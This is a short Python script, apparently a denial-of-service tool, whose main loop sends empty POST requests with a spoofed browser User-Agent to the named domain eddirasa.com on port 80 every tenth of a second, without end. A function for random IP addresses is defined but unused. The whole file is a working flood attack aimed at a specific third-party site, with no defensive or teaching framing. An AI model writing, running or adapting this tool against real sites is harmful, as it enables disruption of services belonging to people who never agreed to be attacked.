import requests
import random
import time

def get_random_ip():
    return "192.168.1.{}".format(random.randint(1, 254))

def do_attack(target, port):
    url = "http://{}:{}".format(target, port)
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Content-Length": "0",
    }
    requests.post(url, headers=headers)

def main():
    target = "eddirasa.com"
    port = 80
    while True:
        do_attack(target, port)
        time.sleep(0.1)

if __name__ == "__main__":
    main()
